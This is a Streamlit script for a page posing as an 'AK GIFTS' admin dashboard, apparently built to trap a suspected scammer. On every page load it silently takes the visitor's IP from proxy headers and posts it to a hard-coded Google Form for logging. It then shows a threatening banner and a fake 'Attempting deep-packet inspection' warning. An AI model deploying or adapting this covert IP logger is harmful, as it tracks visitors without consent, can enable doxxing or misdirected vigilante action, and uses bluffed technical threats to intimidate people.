import streamlit as st
import requests
from datetime import datetime

# 1. Force the page to refresh its logic
st.set_page_config(page_title="AK GIFTS | Security", layout="wide")

# 2. THE MOST AGGRESSIVE IP CAPTURE
def get_real_public_ip():
    # Check every possible header where a real IP could be hidden
    headers = st.context.headers
    
    # Priority 1: The standard proxy header
    if headers.get("X-Forwarded-For"):
        return headers.get("X-Forwarded-For").split(",")[0].strip()
    
    # Priority 2: Real-IP header (used by some proxies)
    if headers.get("X-Real-IP"):
        return headers.get("X-Real-IP")
    
    # Priority 3: Streamlit 2026 Native Context
    if hasattr(st.context, 'ip_address') and st.context.ip_address:
        return st.context.ip_address
        
    return "Unknown"

# We DO NOT put this in a session state, so it checks EVERY time the page loads
user_ip = get_real_public_ip()

# 3. LOGGING (Google Form)
FORM_ID = "1FAIpQLSeL-8OqJ1WEUlBsTBcr_LVOJrngK-eHmRsSi7ufcfva10UHcA"
ENTRY_ID = "entry.444157392"

# We send the data every time the IP changes
if user_ip != "Unknown" and not user_ip.startswith("192.168"):
    try:
        url = f"https://docs.google.com/forms/d/e/{FORM_ID}/formResponse"
        requests.post(url, data={ENTRY_ID: user_ip})
    except:
        pass

# 4. DASHBOARD UI
st.title("🎁 AK GIFTS | ADMIN")
st.markdown("""
    <div style="color: #ff4b4b; font-size: 24px; font-weight: bold; border: 2px solid red; padding: 15px; text-align: center;">
    ⚠️ YOUR SCAM HAVE BEEN COMING TO AN END BE SAFE MAN
    </div>
    """, unsafe_allow_html=True)

st.divider()

# Display the IP clearly
st.subheader("📡 SYSTEM TRACE RESULTS")
st.code(f"DETECTED_IP: {user_ip}")

if "vpn" in user_ip.lower() or user_ip == "Unknown":
    st.warning("Warning: Target using Proxy/VPN. Attempting deep-packet inspection...")

st.write(f"**Scan Time:** {datetime.now().strftime('%H:%M:%S')}")

# 5. ADMIN VIEW
if st.query_params.get("admin") == "true":
    st.divider()
    st.write("🕵️ **MASTER LOG:** Check your Google Sheet. If the VPN is working, a new IP should appear there every time you switch VPN locations and refresh.")
